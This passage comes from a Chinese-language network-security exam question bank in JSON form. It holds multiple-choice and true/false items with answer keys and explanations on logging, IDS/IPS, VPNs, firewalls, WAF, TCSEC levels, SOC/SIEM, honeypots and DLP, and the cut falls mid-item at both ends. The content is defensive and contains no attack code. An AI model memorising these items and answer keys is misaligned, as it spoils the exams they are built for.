/b>。NTP 同步使防火墙、主机、应用日志能按同一时间轴还原攻击链；时间偏差会直接导致事件顺序错乱、证据链失效。\u003cb>易错点\u003c/b>：手工校时不精确也不可持续；关日志是自毁取证能力。\u003cb>记忆\u003c/b>：'没有统一时间，就没有事件线'。"},{"c":"log","t":"s","q":"与在交换机镜像口抓取全量数据包相比，NetFlow 流量日志的主要特点是（　）。","o":["只记录会话级五元组与流量统计信息，开销小、适合长期留存与异常外联分析","包含完整的报文载荷，可直接还原明文密码","只能统计 Web 流量","必须部署在每台主机上才能工作"],"a":0,"e":"\u003cb>NetFlow/sFlow 记录'谁在什么时间用什么端口访问了谁、传了多少字节'，不含载荷内容\u003c/b>；开销远低于全包抓取，适合长期存储，常用于发现异常外联（C2 心跳、深夜大流量外传）。还原载荷需全包抓取，存储成本高且涉隐私。\u003cb>记忆\u003c/b>：'Flow 看账本，抓包看内容'。"},{"c":"log","t":"s","q":"想在核心交换机上长期旁路采集流量供 IDS 分析，正确的部署方式是（　）。","o":["配置端口镜像（SPAN）或使用 TAP，将流量复制到 IDS 的监听口","将 IDS 串联在核心链路上，业务流量必须经过它","在每台终端上安装抓包软件再汇总","把交换机的 Syslog 日志导出给 IDS 即可"],"a":0,"e":"\u003cb>旁路部署：SPAN 端口镜像或 TAP 分光，复制一份流量给 IDS\u003c/b>，不影响业务转发，IDS 故障也不影响网络。\u003cb>易错点\u003c/b>：串联实时阻断的是 IPS，IDS 旁路检测；Syslog 是设备事件日志，不是全量流量，无法替代镜像。\u003cb>记忆\u003c/b>：'IDS 旁路镜像看，IPS 串联路上拦'。"},{"c":"log","t":"s","q":"Linux 服务器疑似遭 SSH 暴力破解，应优先排查的日志文件是（　）。","o":["/var/log/secure 或 /var/log/auth.log","/var/log/dmesg","/etc/passwd","/boot 目录下的文件"],"a":0,"e":"\u003cb>SSH 登录成败记录在 /var/log/secure（CentOS/RHEL 系）或 /var/log/auth.log（Debian/Ubuntu 系）\u003c/b>：大量 Failed password 说明正被爆破；Accepted 后跟异常 IP 或异常时段则可能已失陷。配合 last（成功登录历史）、lastb（失败登录）交叉验证。\u003cb>易错点\u003c/b>：dmesg 是内核环形缓冲，passwd 是账户文件，均不是登录日志。\u003cb>记忆\u003c/b>：'红系 secure，Deb 系 auth.log'。"},{"c":"log","t":"m","q":"Windows 应急排查中，下列安全事件 ID 与含义对应正确的有（　）。","o":["4624：登录成功","4625：登录失败，大量出现可反映爆破行为","4720：用户账户被创建","4634：系统开机自检完成"],"a":[0,1,2],"e":"\u003cb>4624 登录成功、4625 登录失败、4720 创建账户、4726 删除账户、7045 安装新服务（常见持久化痕迹）\u003c/b>是 Windows 应急排查的五个核心事件。\u003cb>4634 是注销事件\u003c/b>，与开机自检无关。\u003cb>记忆\u003c/b>：'4624 进、4625 败、4720 建号、7045 挂服务'。"},{"c":"log","t":"s","q":"应急响应时发现攻击者已清空被入侵主机的本地日志，最有价值的补充取证来源是（　）。","o":["网络侧设备日志与流量记录（防火墙/WAF/上网行为/NetFlow）以及转发至独立日志服务器的副本","被清空文件所在磁盘分区的剩余容量","浏览器收藏夹","桌面壁纸文件"],"a":0,"e":"\u003cb>日志外发（独立日志服务器/SIEM）与网络侧留痕是抗'日志清除'的核心设计\u003c/b>：攻击者清得掉主机日志，清不掉已发出的流量与第三方记录；还可配合文件系统残留（NTFS 的 $MFT、USN Journal）与内存取证。\u003cb>加固原则\u003c/b>：日志服务器权限分离、只增不改。\u003cb>记忆\u003c/b>：'日志要出门，出了门才安全'。"},{"c":"log","t":"m","q":"下列属于日志安全保护措施的有（　）。","o":["将日志实时转发至独立的日志服务器或 SIEM 集中存储","日志存储设置只增不改（append-only）权限，防止篡改","日志中的敏感字段（如身份证号、口令）做脱敏处理","所有日志仅保留在本机且任何运维人员都可随意删除"],"a":[0,1,2],"e":"\u003cb>日志保护四原则：集中存储、防篡改（只增不改/转发异地）、脱敏、权限分离\u003c/b>。日志仅留本机且人人可删，正是攻击者清空日志后无从取证的典型反面配置。\u003cb>记忆\u003c/b>：「集中、锁死、脱敏、限权」。"},{"c":"device","t":"s","q":"VPN架构采用的多种安全机制中，不包括（　）。","o":["隧道技术","身份认证技术","信息隐藏技术","密钥管理技术"],"a":2,"e":"VPN的核心安全机制包括\u003cb>隧道技术\u003c/b>（封装数据包）、\u003cb>身份认证技术\u003c/b>（验证用户）、\u003cb>密钥管理技术\u003c/b>（密钥生成与分发）以及\u003cb>加密技术\u003c/b>；\u003cb>信息隐藏技术（隐写术）不属于VPN\u003c/b>——隐写隐藏'通信存在性'，VPN隐藏'通信内容'。\u003cb>扩展\u003c/b>：VPN保密性靠加密、完整性靠MAC校验、身份靠认证；典型协议PPTP（低危）、L2TP/IPsec、SSL VPN、OpenVPN。"},{"c":"device","t":"s","q":"下列VPN协议中，已被破解、安全性最低、不推荐使用的是（　）。","o":["PPTP","L2TP/IPsec","SSL VPN","OpenVPN"],"a":0,"e":"\u003cb>PPTP\u003c/b>加密强度弱且已被实际破解，不推荐；L2TP/IPsec中等；SSL VPN与OpenVPN安全性高。"},{"c":"device","t":"s","q":"基于HTTPS、无需专用客户端、目前被广泛推荐的VPN类型是（　）。","o":["PPTP VPN","L2TP VPN","SSL VPN","GRE隧道"],"a":2,"e":"\u003cb>SSL VPN\u003c/b>工作在\u003cb>应用层、基于HTTPS（443）\u003c/b>，无需专用客户端，浏览器即可访问，穿越NAT/防火墙能力强、易部署，是当前\u003cb>最推荐的远程接入方式\u003c/b>。\u003cb>对比\u003c/b>：PPTP已被破解（不推荐），L2TP/IPsec需客户端但传输层安全强度高，GRE隧道只封装不加密。\u003cb>扩展\u003c/b>：强调易用/免客户端选SSL VPN，强调终端全域加密选IPsec VPN，是常考选型题。"},{"c":"device","t":"s","q":"IDS（入侵检测系统）的部署方式是（　）。","o":["旁路监听（镜像流量）","串接在网络出口","部署在终端","部署在DNS服务器"],"a":0,"e":"\u003cb>IDS（入侵检测系统）采用旁路监听方式部署\u003c/b>（交换机镜像端口SPAN获取流量副本），\u003cb>只检测、只告警，不阻断\u003c/b>流量，对业务性能影响小，误报不会中断业务。\u003cb>对比IPS\u003c/b>：IPS串接在线部署在流量路径上，可实时阻断，但引入延迟且误报可能切断正常业务。\u003cb>记忆\u003c/b>：'D=Detect检测，P=Prevent防御'，检测旁路告警，防御串接阻断。"},{"c":"device","t":"s","q":"IPS（入侵防御系统）的部署方式是（　）。","o":["旁路监听","串接在网络路径中","只部署在核心交换机旁","无需部署"],"a":1,"e":"\u003cb>IPS（入侵防御系统）串接（在线/inline）部署在流量必经路径上\u003c/b>，具备检测+阻断能力，可实时拦截攻击流量。\u003cb>代价\u003c/b>：所有流量经其转发，引入延迟；特征误报可能误杀正常业务，设备故障可能导致网络中断，需做好bypass与双机冗余。\u003cb>对比IDS\u003c/b>：IDS旁路监听仅告警。\u003cb>记忆\u003c/b>：'串接=能拦=IPS'，'旁路=只看=IDS'。"},{"c":"device","t":"s","q":"IDS与IPS在响应方式上的主要区别是（　）。","o":["IDS仅告警，IPS可告警并阻断","IDS可阻断，IPS仅告警","两者都能阻断","两者都只能告警"],"a":0,"e":"IDS与IPS最本质的区别是\u003cb>响应方式：IDS只检测告警，IPS检测并阻断\u003c/b>（部署方式也对应：旁路vs串接）。\u003cb>记忆\u003c/b>：D=Detect（检测），P=Prevent（防御/阻断）。\u003cb>扩展\u003c/b>：IPS误报风险更高（可能阻断正常流量），常需调整规则库与白名单；常见组合为'IDS旁路做监控审计 + IPS关键出口串接做防护'。"},{"c":"device","t":"s","q":"出现误报时，可能直接阻断正常业务流量的是（　）。","o":["IDS","IPS","堡垒机","漏洞扫描器"],"a":1,"e":"\u003cb>IPS串接部署且具备阻断能力\u003c/b>，误报时会错误拦截正常流量，造成业务中断；IDS误报仅产生多余告警。"},{"c":"device","t":"s","q":"基于已知攻击特征库进行匹配的检测技术，其主要缺点是（　）。","o":["误报率高","无法检测未知攻击（0day）","性能开销大","无法部署"],"a":1,"e":"特征检测准确率高，但\u003cb>只能发现特征库已有的攻击，无法检测未知攻击\u003c/b>；异常检测则可发现未知攻击但误报较多。"},{"c":"device","t":"s","q":"异常检测技术的基本原理是（　）。","o":["匹配已知攻击特征","对正常行为建模，检测偏离基线的行为","加密全部流量","统计端口扫描"],"a":1,"e":"\u003cb>异常检测\u003c/b>先建立正常行为基线，再标记显著偏离基线的行为，可发现未知攻击，但基线不准时误报多。"},{"c":"device","t":"s","q":"包过滤防火墙工作在OSI的（　）。","o":["应用层","传输层","网络层","物理层"],"a":2,"e":"包过滤防火墙基于\u003cb>网络层\u003c/b>工作：按\u003cb>源/目的IP地址、端口、协议类型\u003c/b>过滤数据包，速度快、开销小，但不检查应用层内容，无法识别SQL注入等应用攻击。\u003cb>防火墙演进\u003c/b>：包过滤（网络层）→状态检测（传输层，跟踪连接状态）→应用层防火墙（深度解析应用协议）→下一代防火墙NGFW（集成IPS/AV/应用识别）。\u003cb>记忆\u003c/b>：'按IP/端口过滤'=网络层包过滤。"},{"c":"device","t":"s","q":"状态检测防火墙的主要特点是（　）。","o":["只检查IP头","跟踪连接状态并动态建立过滤规则","深度解析应用层内容","只防病毒"],"a":1,"e":"状态检测防火墙维护\u003cb>连接状态表（会话表）\u003c/b>，跟踪连接状态转换（如TCP SYN/SYN-ACK/ACK），属于\u003cb>传输层\u003c/b>技术，可识别会话上下文（如只放行'对外主动连接的外部应答'），比简单包过滤更精确，又比应用层防火墙快。\u003cb>对比\u003c/b>：包过滤只看单个包；状态检测结合上下文；应用层防火墙解析内容。\u003cb>记忆\u003c/b>：'状态'=记住连接，动态放行应答流量。"},{"c":"device","t":"s","q":"应用层防火墙（WAF类）的主要特点是（　）。","o":["只按端口过滤","深度检测应用层协议内容（如HTTP请求）","只工作在网络层","只能防DDoS"],"a":1,"e":"应用层防火墙（如WAF）\u003cb>深度解析应用层协议内容\u003c/b>（HTTP请求/响应、SQL语句、命令等），可识别并拦截\u003cb>SQL注入、XSS、命令注入\u003c/b>等Web攻击，是'应用层/Web应用防火墙'的典型形态。\u003cb>对比\u003c/b>：包过滤防火墙只看IP/端口；状态检测看连接状态。\u003cb>扩展\u003c/b>：WAF可基于签名、语义分析与机器学习检测，还能做协议合规检查、CC防护，但会增加延迟、存在误报，需配置白名单。"},{"c":"device","t":"s","q":"下一代防火墙（NGFW）区别于传统防火墙的主要特点是（　）。","o":["只能包过滤","集成了IPS、防病毒、应用识别、用户识别等功能","价格更贵","只支持千兆带宽"],"a":1,"e":"NGFW在传统防火墙基础上\u003cb>深度集成入侵防御、防病毒、应用与用户识别\u003c/b>等能力，实现一体化防护。"},{"c":"device","t":"s","q":"堡垒机在安全运维中的主要作用是（　）。","o":["拦截外部攻击","集中管理运维访问，记录操作行为，实现运维审计","扫描内网漏洞","加密数据库"],"a":1,"e":"\u003cb>堡垒机\u003c/b>是运维人员的统一入口：集中账号管理、身份认证、操作录制与审计，解决“运维操作不可见”的问题。"},{"c":"device","t":"s","q":"数据库审计系统（DAS）的主要功能是（　）。","o":["监控和记录数据库访问与SQL操作行为","给数据库字段加密","防止SQL注入攻击","备份恢复数据库"],"a":0,"e":"数据库审计系统（DAS）通过\u003cb>流量镜像/旁路部署或Agent方式，监控并记录数据库访问行为与SQL操作\u003c/b>（谁、何时、执行了什么SQL、返回什么），用于\u003cb>等保合规审计与数据泄露溯源\u003c/b>。\u003cb>辨析\u003c/b>：字段加密是数据加密产品（加密网关/透明加密）的职责；防SQL注入是WAF/数据库防火墙的职责；备份恢复是备份系统的职责。\u003cb>扩展\u003c/b>：DAS常结合审计日志留存、高危SQL告警（如DROP/脱库）使用。"},{"c":"device","t":"s","q":"TCSEC（橙皮书）标准中，处理安全信息需要的最低安全级别是（　）。","o":["C1","C2","A1","D"],"a":1,"e":"\u003cb>C2（受控访问保护）\u003c/b>具备审计、隔离、身份鉴别能力，是处理安全信息的最低要求；C1仅有基本自主保护。"},{"c":"device","t":"s","q":"TCSEC中C2级的名称是（　）。","o":["选择性安全保护","受控访问保护","标签安全保护","验证设计"],"a":1,"e":"C1选择性安全保护，\u003cb>C2受控访问保护\u003c/b>（含审计、隔离、身份鉴别），B1标签安全（强制访问控制），A1验证设计。"},{"c":"device","t":"s","q":"TCSEC可信计算机系统评估准则又被称为（　）。","o":["橙皮书","蓝皮书","白皮书","红皮书"],"a":0,"e":"TCSEC（可信计算机系统评估准则）由美国国防部1985年发布，封面为\u003cb>橙色\u003c/b>，俗称\u003cb>橙皮书\u003c/b>。\u003cb>级别从低到高\u003c/b>：D（无保护）→C1（自主保护）→C2（受控访问保护，引入审计）→B1（标签安全/MAC）→B2→B3→A1（验证设计，最高）。\u003cb>扩展\u003c/b>：CC（通用准则ISO/IEC 15408）是当前国际通用的替代标准；C2是处理安全信息的最低级别。"},{"c":"device","t":"s","q":"TCSEC中最高的安全级别是（　）。","o":["B3","A1","C2","B1"],"a":1,"e":"TCSEC安全级别从低到高：\u003cb>D \u003c C1 \u003c C2 \u003c B1 \u003c B2 \u003c B3 \u003c A1\u003c/b>，\u003cb>A1（验证设计）为最高级\u003c/b>，要求对安全机制进行形式化验证。\u003cb>常见考点\u003c/b>：C2是处理安全信息所需的最低级别（受控访问保护，含审计、隔离、身份鉴别）；B1引入强制访问控制MAC。\u003cb>记忆\u003c/b>：'A级最高、C2最低可用'；A1强调形式化数学验证，实际产品很少达到。"},{"c":"device","t":"s","q":"TCSEC中B1级的主要特征是（　）。","o":["强制访问控制（安全标签）","形式化验证","基本的自主访问控制","无安全要求"],"a":0,"e":"TCSEC\u003cb>B1级（标签安全保护）\u003c/b>的主要特征是在C2基础上引入\u003cb>强制访问控制（MAC）\u003c/b>：为主体（用户/进程）和客体（文件/设备）赋予\u003cb>安全标签\u003c/b>，依据标签规则（如机密等级）决定能否访问，系统级强制，用户不能随意更改。\u003cb>对比\u003c/b>：C2是自主访问控制DAC（文件属主决定权限），B1起为MAC（系统强制）。\u003cb>记忆\u003c/b>：'B1=标签+MAC'。"},{"c":"device","t":"f","q":"IDS采用串接方式部署在网络出口，会对流量产生延迟。","a":1,"e":"\u003cb>错误。\u003c/b>IDS是\u003cb>旁路监听\u003c/b>部署（交换机镜像端口），不串接在流量路径上，只做分析告警，\u003cb>基本不影响业务性能、不产生延迟\u003c/b>；\u003cb>串接部署、可能对流量产生延迟与中断风险的正是IPS\u003c/b>。\u003cb>记忆\u003c/b>：'旁路=IDS只看不管'，'串接=IPS能拦但拖累'。题目把IPS的特性安到IDS头上，故错误。"},{"c":"device","t":"s","q":"防火墙更安全的默认策略是（　）。","o":["默认拒绝（白名单，未明确允许即拒绝）","默认允许（黑名单，未明确禁止即放行）","默认转发所有流量","不配置任何策略"],"a":0,"e":"\u003cb>默认拒绝＋按需放行\u003c/b>暴露面最小；黑名单无法穷举风险。等保与行业最佳实践均要求白名单基线——这也是“最小权限”思想在边界上的体现。"},{"c":"device","t":"s","q":"DMZ区域的用途是（　）。","o":["部署对外服务，隔离保护内网","员工上网休闲区","存放备份数据","部署核心数据库"],"a":0,"e":"\u003cb>DMZ（非军事区）\u003c/b>放置Web、邮件等对外服务：即使被攻陷也难以直达内网。经典三区：Trust内网/Untrust外网/DMZ；规则方向：内网可访DMZ，DMZ严格限制主动访问内网。"},{"c":"device","t":"s","q":"WAF主要防御的攻击类型是（　）。","o":["SQL注入、XSS、WebShell上传等Web应用层攻击","网络层DDoS流量","二层MAC泛洪","交换机环路"],"a":0,"e":"\u003cb>WAF工作在应用层，解析HTTP/HTTPS\u003c/b>，针对OWASP Top 10类Web攻击；部署方式有透明桥接、反向代理、旁路（仅检测）。WAF是缓解手段，不能替代代码修复与安全开发。"},{"c":"device","t":"s","q":"堡垒机4A指的是（　）。","o":["账号、认证、授权、审计","防御、检测、响应、恢复","加密、签名、摘要、密钥","带宽、延迟、丢包、抖动"],"a":0,"e":"4A=\u003cb>Account统一账号、Authentication集中认证、Authorization分级授权、Audit全程审计\u003c/b>。运维操作必须经堡垒机，可录像回放，满足等保对运维审计的要求。"},{"c":"device","t":"s","q":"SOC/态势感知平台的核心价值是（　）。","o":["全量日志集中关联分析，呈现安全态势并闭环处置","替代所有安全设备","完全自动修复漏洞","提高网络带宽利用率"],"a":0,"e":"SOC采集日志与流量，通过\u003cb>关联规则＋机器学习\u003c/b>发现单点设备看不到的潜伏威胁，统一告警、工单与处置闭环。它是\u003cb>人＋流程＋技术（SIEM）\u003c/b>的运营体系，不是买来即安全的盒子。"},{"c":"device","t":"s","q":"蜜罐的主要作用是（　）。","o":["诱捕攻击者、感知与延迟攻击","直接杀灭病毒","替代防火墙","加速业务访问"],"a":0,"e":"蜜罐\u003cb>伪装高价值目标\u003c/b>吸引攻击，记录攻击手法并产生高置信度告警，同时拖延攻击者。属于主动防御手段；部署时须做好隔离，防止被攻破后作为跳板攻击内网。"},{"c":"device","t":"s","q":"沙箱检测恶意样本的原理是（　）。","o":["在隔离的虚拟环境中运行样本，监控其行为","把样本发到互联网上任其传播","比对文件名与扩展名","询问杀毒软件厂商"],"a":0,"e":"静态免杀的样本在沙箱中\u003cb>动态执行\u003c/b>会暴露文件、注册表、网络等真实行为。局限：反虚拟机、延时触发、环境检测可逃逸——需与静态检测、威胁情报互补使用。"},{"c":"device","t":"s","q":"漏洞扫描与渗透测试的区别是（　）。","o":["扫描自动发现已知漏洞，渗透测试模拟攻击验证能否实际利用","两者完全相同","扫描更深入，渗透只是表面","渗透测试由扫描器自动完成"],"a":0,"e":"\u003cb>扫描器基于特征库自动探测\u003c/b>版本与配置缺陷，覆盖广但有误报；\u003cb>渗透测试以人工模拟攻击链\u003c/b>验证真实风险与影响。二者互补：先扫描铺面，再渗透验证重点。"},{"c":"device","t":"s","q":"IDS把正常访问判定为攻击，这种情况称为（　）。","o":["误报（False Positive）","漏报（False Negative）","拒绝服务","策略路由"],"a":0,"e":"\u003cb>误报=把正常当攻击\u003c/b>，大量误报造成告警疲劳、掩盖真实威胁；\u003cb>漏报=把攻击当正常\u003c/b>，危害更隐蔽。特征库更新与阈值调优是IDS日常运营的核心工作。"},{"c":"device","t":"s","q":"IPsec协议中同时提供加密与认证功能的组件是（　）。","o":["ESP","AH","IKE","NAT-T"],"a":0,"e":"\u003cb>AH只提供认证与完整性\u003c/b>；\u003cb>ESP提供加密＋认证＋防重放\u003c/b>，是VPN数据保护的主力。IKE负责密钥协商，NAT-T用于解决NAT环境下的穿越问题。"},{"c":"device","t":"s","q":"IPsec隧道模式保护的对象是（　）。","o":["整个原始IP包（重新封装新的外层IP头）","仅TCP载荷","仅HTTP内容","仅路由信息"],"a":0,"e":"\u003cb>隧道模式\u003c/b>对整个原始IP包加密并封装新IP头，用于网关间Site-to-Site VPN；\u003cb>传输模式\u003c/b>只保护载荷，用于主机到主机通信。记忆：VPN组网用隧道模式。"},{"c":"device","t":"s","q":"SSL VPN与IPSec VPN的说法，正确的是（　）。","o":["SSL VPN基于443端口穿透性好，IPSec更适合站点间整网互联","SSL VPN必须用光纤","IPSec只能传输邮件","SSL VPN速度必然更快"],"a":0,"e":"\u003cb>SSL VPN走应用层HTTPS\u003c/b>，几乎不被中间防火墙拦截，可按应用细粒度发布；\u003cb>IPSec在网络层加密一切流量\u003c/b>，适合总部-分支整网互联，但需客户端与策略配置，NAT环境需额外处理。"},{"c":"device","t":"s","q":"零信任架构的核心思想是（　）。","o":["永不信任、持续验证、按需最小授权","内网即可信，重点防护边界","一次登录终身有效","只信任经过加密的流量"],"a":0,"e":"零信任打破\u003cb>“进了内网就可信”的边界假设\u003c/b>：对每次访问都动态校验身份、设备与环境，验证通过才按最小权限放行。微隔离、SDP、统一身份(IAM)是常见落地手段。"},{"c":"device","t":"f","q":"只要部署了防火墙，就能防御内部人员违规操作与病毒在内部的传播。","a":1,"e":"错误。防火墙控制的是\u003cb>网络边界\u003c/b>，不管内部东西向流量；内网威胁需要堡垒机审计、终端防病毒、微隔离、准入控制等组合手段——没有单台设备能解决所有问题。"},{"c":"device","t":"s","q":"部署“假目标”诱使攻击者攻击并记录其手法特征的系统是（　）。","o":["蜜罐","防火墙","IDS","VPN网关"],"a":0,"e":"\u003cb>蜜罐无真实业务，任何访问都高度可疑\u003c/b>，用于诱捕、消耗攻击资源、采集情报与内网横传预警；分高/中/低交互。注意做好隔离与合规，避免蜜罐本身被当跳板。衍生概念：蜜网（蜜罐组网）、蜜饵（诱饵数据）。"},{"c":"device","t":"s","q":"SOC（安全运营中心）的核心职能是（　）。","o":["只负责采购安全设备","7×24集中监控、研判、响应与处置的闭环运营","编写业务代码","机房物理巡检"],"a":1,"e":"SOC以SIEM/SOAR为工作台，分L1监控告警、L2事件研判、L3深度分析与溯源，\u003cb>把“设备能力”转化为持续可控的“处置能力”\u003c/b>，并用MTTD/MTTR度量效率。买设备不等于有安全，运营才是关键。"},{"c":"device","t":"s","q":"SIEM平台的核心能力是（　）。","o":["仅做数据备份","日志集中采集、标准化与关联分析，并留存告警","物理门禁管理","网页防篡改"],"a":1,"e":"\u003cb>SIEM汇聚海量异构日志（syslog/CEF等）归一化\u003c/b>，用关联规则还原攻击链（如同一IP短时多次登录失败后成功），结合UEBA做行为基线异常发现。等保/关基“日志集中留存不少于6个月”的要求正是其天然职责。"},{"c":"device","t":"s","q":"威胁情报中的IOC指的是（　）。","o":["行业合规标准","可用于检测失陷的特征指标（恶意IP、域名、URL、文件哈希等）","加密算法库","设备保修卡"],"a":1,"e":"\u003cb>IOC（失陷指标）\u003c/b>用于设备封禁与全网回溯检索，与描述攻击手法的TTP相对；IOC易失效需持续更新。共享格式与协议为STIX/TAXII。情报贵在闭环：消费->检测->回溯->反馈更新。"},{"c":"device","t":"s","q":"对可疑邮件附件进行隔离环境内运行并观察其行为的检测方式是（　）。","o":["静态特征查杀","沙箱动态检测","黑白名单","内容过滤"],"a":1,"e":"\u003cb>沙箱让未知样本在受控虚拟环境中真实运行\u003c/b>，记录进程、外连、释放文件、注册表修改等行为并自动生成IoC，弥补特征码查杀无法发现未知样本的短板。局限：反沙箱技术（延时触发、环境探测）与沙箱逃逸，需与引擎+情报互补。"},{"c":"device","t":"s","q":"DLP（数据防泄漏）系统的核心能力是（　）。","o":["识别敏感数据并在终端、网络、邮件等通道实施监控与阻断","查杀勒索病毒","拦截DDoS流量","账号口令管理"],"a":0,"e":"\u003cb>DLP按内容识别（关键字/正则/数据指纹/OCR）在多通道落地策略：审计、告警、阻断、加密\u003c/b>，覆盖终端拷贝、邮件外发、网盘上传等路径。前提是先做数据分类分级，否则误报淹没业务。"},{"c":"device","t":"s","q":"对抗大流量DDoS攻击的有效手段是（　）。","o":["本地防火墙封IP","运营商近源牵引清洗/高防线路","升级服务器内存","修改DNS TTL"],"a":1,"e":"大流量攻击会直接打满上游链路，\u003cb>本地设备无从抵抗，必须依靠运营商近源清洗、高防IP或Anycast分散\u003c/b>；应用层CC则用验证码、JS质询、速率限制应对。预案与演练（含勒索型DDoS勒索场景）是关键。"},{"c":"device","t":"s","q":"WAF通常的部署方式是（　）。","o":["旁路镜像只做检测","串联反向代理部署在Web服务器前","部署在数据库后","部署在办公终端"],"a":1,"e":"\u003cb>WAF串联（反向代理/透明桥）在Web前，解析HTTP/HTTPS流量并阻断SQL注入、XSS、Webshell上传、扫描器等\u003c/b>；旁路只能检测不能阻断。HTTPS需先解密；误拦需调白名单，规则持续更新可作为“虚拟补丁”缓解未修复窗口。"},{"c":"device","t":"s","q":"“先认证后连接、默认不信任任何位置与网络”的安全架构是（　）。","o":["边界防御","零信任架构","纵深防御模型","P2P组网"],"a":1,"e":"\u003cb>零信任：永不信任、持续验证\u003c/b>。核心组件：策略执行点PEP与策略决策点PDP；典型技术：SDP单包授权（SPA，端口隐身）、微隔离限制横向移动、基于身份+设备健康度的动态授权。打破“进了内网即可信”的旧边界假设。"},{"c":"device","t":"s","q":"EDR与NDR分别指（　）。","o":["终端检测响应与网络检测响应","加密传输与数据路由","邮件网关与域名解析","漏洞扫描与补丁分发"],"a":0,"e":"\u003cb>EDR在终端侧采集进程/文件/注册表行为链，支持一键隔离与溯源；NDR在网络侧基于流量元数据分析异常\u003c/b>（如横向扫描、异常外连）。两者与SIEM联动，补齐“终端可见性”与“横向移动”两大盲区。"},{"c":"device","t":"s","q":"上网行为管理设备的主要作用是（　）。","o":["加密全部上网流量","对员工上网行为进行识别、审计与管控并留存记录","替代防火墙","加速内网访问"],"a":1,"e":"\u003cb>识别应用与URL分类，按策略限速、阻断、审计留痕\u003c/b>，满足合规留痕要求并防范数据经网页通道外泄；需注意员工隐私的合规告知。常与DLP配合覆盖Web/邮件外发通道。"},{"c":"device","t":"s","q":"邮件安全网关的反钓鱼能力主要依赖（　）。","o":["仅垃圾邮件关键词","SPF/DKIM/DMARC验证+URL重写检测+附件沙箱","增大附件限制","邮件定时投递"],"a":1,"e":"\u003cb>SPF/DKIM/DMARC验证发件域防伪造\u003c/b>，URL重写+点击时检测防钓鱼链接，附件进沙箱 detonation。钓鱼是入侵第一入口，技术网关+人员意识培训+便捷的上报通道需三管齐下。"},{"c":"device","t":"s","q":"IPsec协议中同时提供加密与完整性保护的协议是（　）。","o":["AH","ESP","IKE","GRE"],"a":1,"e":"\u003cb>AH只提供认证与防重放（不加密）；ESP提供加密+认证\u003c/b>；两者均有传输模式（保护载荷，端到端）与隧道模式（封装整个原IP包并加新头，网关间VPN）；SA由IKE协商建立。"},{"c":"device","t":"s","q":"IPsec VPN与SSL VPN的典型定位区别是（　）。","o":["IPsec适合站点到站点互联，SSL VPN适合远程用户按应用接入","两者完全相同","SSL VPN只能加密网页不能访问内网","IPsec只能用于无线网络"],"a":0,"e":"\u003cb>IPsec工作在网络层，透明承载各种协议，适合分支/机房互联但配置复杂；SSL VPN工作在应用层，免装或轻客户端，可按应用/用户细粒度授权，适合出差远程办公\u003c/b>。SSL VPN暴露在公网须重点防护（MFA、最小授权、及时补丁）。"},{"c":"device","t":"s","q":"态势感知平台的基本要素是（　）。","o":["全面采集+关联分析+可视化呈现+预警处置闭环","仅大屏展示","仅资产台账","仅漏洞列表"],"a":0,"e":"底座=\u003cb>日志与流量数据+资产库+威胁情报\u003c/b>；中部=关联分析与UEBA；出口=告警工单闭环与指挥大屏。平台只是工具，配套的运营人员、流程与演练（攻防对抗）才决定实际效果。"},{"c":"device","t":"s","q":"下一代防火墙（NGFW）与传统防火墙的主要区别是（　）。","o":["NGFW更便宜","NGFW集成IPS、应用识别、用户身份识别等深度检测能力","NGFW不需要规则配置","NGFW只用于无线网络"],"a":1,"e":"\u003cb>NGFW在传统防火墙基础上增加了\u003c/b>：应用层识别（不只是端口，而是识别具体应用如微信/QQ）、集成IPS/AV、基于用户身份的策略（不只是IP）、SSL解密、沙箱联动、威胁情报。策略应基于应用+用户+内容多维度，而非仅基于IP/端口。"},{"c":"device","t":"s","q":"堡垒机的主要功能不包括（　）。","o":["集中管理服务器运维访问（SSH/RDP/VNC等）","录像/回放运维操作过程","拦截Web攻击","细粒度访问控制与权限管理"],"a":2,"e":"\u003cb>堡垒机=运维安全审计系统：统一入口管理、双因素认证、操作录像回放、命令级审计与阻断、高危命令过滤\u003c/b>。核心价值：防误操作（可回溯）、防内部威胁（操作可审计）、合规要求（等保/金融）。Web攻击拦截是WAF的职责。"},{"c":"device","t":"s","q":"蜜罐（Honeypot）的主要用途是（　）。","o":["加速网络传输","模拟诱饵系统吸引攻击者，用于威胁情报收集和攻击研究","存储备份数据","提供无线接入"],"a":1,"e":"\u003cb>蜜罐=故意暴露的诱饵系统，无正常业务流量，任何连接都是可疑的\u003c/b>。可用于：捕获0day攻击手法、收集恶意样本、研究攻击者工具和策略（TTP）、预警内网渗透。蜜网（Honeynet）是多个蜜罐组成的网络。高交互蜜罐模拟真实系统但风险更高。"},{"c":"device","t":"s","q":"网络准入控制（NAC）的核心作用是（　）。","o":["加速网络传输","检查终端安全状态（补丁、杀毒、合规性）后决定是否允许接入网络","加密网络流量","负载均衡"],"a":1,"e":"\u003cb>NAC在终端接入网络前评估其安全状态：操作系统补丁、杀毒软件、合规策略等，达标才允许接入，不达标则隔离到修复区\u003c/b>。802.1X是常见网络层NAC协议；产品如Cisco ISE、Aruba ClearPass。NAC有效防止不合规设备带来的内网威胁。"},{"c":"device","t":"s","q":"CDN（内容分发网络）对安全的间接帮助是（　）。","o":["CDN能检测所有恶意攻击","CDN隐藏源站真实IP并分散DDoS攻击流量","CDN替代防火墙","CDN能修复应用漏洞"],"a":1,"e":"\u003cb>CDN将内容缓存到全球边缘节点，用户就近访问\u003c/b>。安全价值：隐藏源站真实IP（增加直接攻击难度）、大带宽分散DDoS流量（但超大攻击仍需专业高防）、减少源站负载。注意：CDN不替代WAF/防火墙，大DDoS仍需专业清洗中心。"},{"c":"device","t":"s","q":"负载均衡设备的安全注意点不包括（　）。","o":["防止源地址欺骗","防止会话固定攻击","负载均衡能自动修复后端应用漏洞","健康检查配置安全"],"a":2,"e":"\u003cb>负载均衡安全注意：防源地址欺骗（获取真实客户端IP需X-Forwarded-For头或Proxy Protocol）、防会话固定（Cookie安全配置）、健康检查不要泄露敏感信息（如用/health而非/）、SSL卸载时注意证书保护\u003c/b>。负载均衡本身不修复应用漏洞。"},{"c":"device","t":"s","q":"DLP（数据防泄漏）系统的检测技术不包括（　